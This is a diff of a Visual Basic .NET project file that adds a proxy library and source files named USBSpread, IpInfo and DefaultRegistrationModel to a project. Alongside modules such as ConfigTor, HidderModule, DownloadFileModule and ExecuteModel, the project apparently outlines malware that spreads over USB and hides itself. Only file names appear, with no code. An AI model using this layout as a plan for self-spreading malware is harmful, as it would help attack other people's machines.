@@ -72,6 +72,9 @@
     <Reference Include="SocksWebProxy">
       <HintPath>C:\Users\Mate\source\repos\ModuleConnect\ModuleConnect\bin\Debug\SocksWebProxy.dll</HintPath>
     </Reference>
+    <Reference Include="starksoft.aspen, Version=1.1.8.0, Culture=neutral, PublicKeyToken=56b8923a24d03eb3, processorArchitecture=MSIL">
+      <HintPath>..\packages\starksoft.aspen.1.1.8\lib\net45\starksoft.aspen.dll</HintPath>
+    </Reference>
     <Reference Include="System" />
     <Reference Include="System.Data" />
     <Reference Include="System.Deployment" />
@@ -106,7 +109,9 @@
     <Compile Include="Interfaces\ICommand.vb" />
     <Compile Include="Main.vb" />
     <Compile Include="Models\Config.vb" />
+    <Compile Include="Models\DefaultRegistrationModel.vb" />
     <Compile Include="Models\ExecuteModel.vb" />
+    <Compile Include="Models\IpInfo.vb" />
     <Compile Include="Moduls\Details\CommunicationDetails.vb" />
     <Compile Include="Moduls\Details\Details.vb" />
     <Compile Include="Moduls\Installers\CopyModule.vb" />
@@ -114,6 +119,7 @@
     <Compile Include="Moduls\IO\UnZIPModule.vb" />
     <Compile Include="Moduls\Network\DownloadFileModule.vb" />
     <Compile Include="Moduls\Network\StreamWrite.vb" />
+    <Compile Include="Moduls\Spreads\USBSpread.vb" />
     <Compile Include="Moduls\Tor\ConfigTor.vb" />
     <Compile Include="Moduls\IO\GetPathes.vb" />
     <Compile Include="Moduls\Installers\HidderModule.vb" />
